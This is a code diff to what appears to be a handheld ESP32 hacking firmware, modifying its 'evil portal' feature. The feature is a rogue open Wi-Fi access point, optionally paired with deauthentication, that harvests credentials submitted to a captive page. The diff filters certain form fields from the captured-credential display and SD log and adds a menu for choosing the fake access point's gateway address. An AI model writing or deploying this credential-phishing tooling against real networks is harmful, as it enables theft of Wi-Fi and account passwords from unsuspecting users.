@@ -20,7 +20,7 @@ void handleCreds() {
       last_cred="";
       for (int i = 0; i < ep->args(); i++) {
         String tmp=ep->argName(i);
-        if(tmp=="q" || tmp.startsWith("cup2") || tmp.startsWith("plain")) continue;
+        if(tmp=="q" || tmp.startsWith("cup2") || tmp.startsWith("plain") || tmp=="P1" || tmp=="P2" || tmp=="P3" || tmp=="P4") continue;
         else {
           html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
           // Prepara dados para salvar no SD
@@ -61,14 +61,27 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
       AP_name = tssid;
     }
 
+    bool defaultIP=true;
+    options = {
+        {"127.0.0.1",   [&]()   { defaultIP=true; }},
+        {"192.168.4.1", [&]()   { defaultIP=false; }},
+    };
+    delay(200);
+    loopOptions(options);
+
     wifiConnected=true;
     drawMainBorder();
     displayRedStripe("Starting..",TFT_WHITE,FGCOLOR);
-
-    IPAddress AP_GATEWAY(172, 0, 0, 1);
     WiFi.mode(WIFI_MODE_AP);
-    WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(AP_name,emptyString,channel);
+    if(defaultIP) {
+      IPAddress AP_GATEWAY(172, 0, 0, 1);
+      WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
+      WiFi.softAP(AP_name,emptyString,channel);
+    } else {
+      IPAddress AP_GATEWAY(192, 168, 4, 1);
+      WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
+      WiFi.softAP(AP_name,emptyString,channel);
+    }
 
     tmp=millis();
     while(millis() - tmp < 3000) yield();
